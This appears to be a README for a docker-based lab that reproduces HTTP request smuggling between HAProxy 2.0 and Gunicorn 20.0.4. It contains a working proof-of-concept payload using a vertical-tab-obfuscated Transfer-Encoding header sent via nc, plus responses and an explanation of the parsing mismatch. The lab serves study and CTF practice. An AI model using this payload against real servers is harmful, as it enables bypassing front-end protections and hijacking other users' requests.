#	LAB3

##	Composition

1.HaProxy 2.0

2.Gunicorn 20.0.4

##	Usage

###	build

```bash
docker-compose up
```

###	check

```bash
$ chmod +x check.sh;./check.sh|grep HTTP
HTTP/1.1 200 OK
HTTP/1.1 200 OK
```

9 HTTP code 200 means all right! 

Enjoy!

###	POC
```bash
printf 'POST / HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Transfer-Encoding:\x0b chunked\r\n'\
'Connection:keep-alive\r\n'\
'Content-Length: 65\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
'POST / HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Content-Length: 1\r\n'\
'\r\n'\
'0'\
| nc 127.0.0.1 9013
```

You will get two responses.

```http
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Mon, 06 Jul 2020 07:45:37 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 0
```

```http
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Mon, 06 Jul 2020 07:45:37 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 1

0
```



For haproxy, the following http request is just one request. It will ignore the `Transfer-Encoding` header and use `Content-Length` header to parse the post body. And more importantly, haproxy will pass the `Transfer-Encoding:[\x0b] chunked` to backend server gunicorn.

```http
POST / HTTP/1.1
Host: localhost
Transfer-Encoding:[\x0b] chunked
Connection:keep-alive
Content-Length: 65

0

POST / HTTP/1.1
Host: localhost
Content-Length: 1

0
```

So, for gunicorn, the http request are two requests because it use `Transfer-Encoding` header to parse the post body. The first request is this.

```http
POST / HTTP/1.1
Host: localhost
Transfer-Encoding:[\x0b] chunked
Connection:keep-alive
Content-Length: 65

0
```

The second request is this.

```http
POST / HTTP/1.1
Host: localhost
Content-Length: 1

0
```



For details, you can build a echo server instead of gunicorn to see how haproxy deal with the `Transfer-Encoding:[\x0b] chunked` header.

#	Reference

[HAProxy HTTP request smuggling](https://nathandavison.com/blog/haproxy-http-request-smuggling)

[DefCon 2020 Quals uploooadit](https://github.com/o-o-overflow/dc2020q-uploooadit)



